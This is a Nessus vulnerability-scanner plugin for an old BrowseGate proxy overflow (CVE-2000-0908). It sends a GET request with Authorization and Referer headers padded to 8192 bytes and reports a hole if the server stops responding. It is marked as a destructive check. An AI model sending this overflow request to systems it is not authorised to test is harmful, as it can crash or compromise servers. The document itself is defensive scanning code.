#
# (C) Tenable Network Security, Inc.
#

# This is an old bug. I don't know if we need _two_ overflows to
# crash BrowseGate or if this crashes any other web server
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID and CVE

include("compat.inc");

if (description)
{
 script_id(11130);
 script_version("$Revision: 1.26 $");
 script_cvs_date("$Date: 2014/05/25 01:37:07 $");

 script_cve_id("CVE-2000-0908");
 script_bugtraq_id(1702);
 script_osvdb_id(1565);

 script_name(english:"BrowseGate HTTP MIME Headers Remote Overflow");
 script_summary(english:"Too long HTTP headers kill BrowseGate");

 script_set_attribute(attribute:"synopsis", value:"It may be possible to execute arbitrary code on the remote web server.");
 script_set_attribute(attribute:"description", value:
"It is possible to kill the remote server by sending it an invalid
request with too long HTTP headers (Authorization and Referer).

BrowseGate proxy is known to be vulnerable to this flaw.

An attacker could exploit this vulnerability to cause the web server
to crash continually or to execute arbitrary code on the system.");
 script_set_attribute(attribute:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/09/18");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/09/21");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(1, "The web server on port "+port+" is dead already.");

r = http_send_recv3(port: port, item: "/", method: 'GET',
  add_headers:
    make_array( "Authorization", "Basic"+crap(8192),
    		"Referer", "http://www.example.com/"+crap(8192) ) );

#	"From: nessus@example.com\r\n",
#	"If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\r\n",
#	"UserAgent: Nessus 1.2.6\r\n\r\n

if (http_is_dead(port: port, retry: 3)) { security_hole(port); }
